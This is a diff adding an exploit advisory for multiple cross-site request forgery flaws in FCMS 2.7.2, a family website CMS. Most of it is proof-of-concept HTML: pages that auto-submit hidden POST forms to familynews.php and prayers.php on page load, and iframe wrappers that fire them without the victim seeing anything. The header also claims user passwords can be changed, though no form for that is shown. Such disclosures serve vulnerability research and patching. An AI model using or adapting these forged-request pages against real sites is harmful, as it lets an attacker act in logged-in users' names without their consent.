@@ -1,0 +1,93 @@
+FCMS_2.7.2 cms and earlier multiple CSRF Vulnerability
+===================================================================================
+# Exploit Title: FCMS_2.7.2 cms multiple CSRF Vulnerability
+
+Download link :http://sourceforge.net/projects/fam-connections/files/Family%20Connections/2.7.2/FCMS_2.7.2.zip/download
+
+# Author: Ahmed Elhady Mohamed
+
+#version : 2.7.2
+
+# Category:: webapps
+
+# Tested on: windows XP Sp2 En
+
+# This vulnerability allows a malicious hacker to change password of a user
+and also it allows changing the website information.
+===================================================================================
+
+
+
+#First we must install all optional sections during installation process.
+      
+#there are csrf in all sections in this application for examples you can add news , pray for , 
+change the password and can do all functionalities are there.
+	
+#here are some examples for prove of concept
+	
+
+#########################################exploit code for Page "familynews.php"################################################	
+	
+	#Save the following codr in a file called "code.html"
+
+		<html>
+			<head>
+				<script type="text/javascript">
+					function autosubmit() {
+						document.getElementById('ChangeSubmit').submit();
+					}	
+				</script>
+			</head>
+			<body  onLoad="autosubmit()">
+				<form method="POST"  action="http://127.0.0.1/FCMS_2.7.2/FCMS_2.7.2/familynews.php"  id="ChangeSubmit">
+					<input type="hidden"  name="title"  value="test" />
+					<input type="hidden"  name="submitadd"  value="Add" />
+					<input type="hidden"  name="post"  value="testcsrf" />
+					<input type="submit" value="submit"/>
+				</form>
+			</body>
+		</html>
+
+
+	
+	#then i called "code.html" from another page 
+
+	<html>
+		<body>
+			<iframe  src="code.html" onLoad=""></iframe>
+		</body>
+	</html>
+
+
+###########################################exploit code for Page "prayers.php" #################################################### 
+	
+	#Save the following code in a file called "code.html"
+	<html>
+		<head>
+			<script type="text/javascript">
+				function autosubmit() {	
+					document.getElementById('ChangeSubmit').submit();
+				}	
+			</script>
+		</head>
+		<body  onLoad="autosubmit()">
+			<form method="POST"  action="http://127.0.0.1/FCMS_2.7.2/FCMS_2.7.2/prayers.php" id="ChangeSubmit">
+				<input type="hidden"  name="for"  value="test" />
+				<input type="hidden"  name="submitadd"  value="Add" />
+				<input type="hidden"  name="desc"  value="testtest" />
+				<input type="submit" value="submit"/>
+			</form>
+		
+		</body>
+	</html>
+	
+	#then i called "code.html" from another page 
+
+	<html>
+		<body>
+			<iframe  src="code.html" onLoad=""></iframe>
+		</body>
+	</html>
+
+
+  	##############################################################################################################################
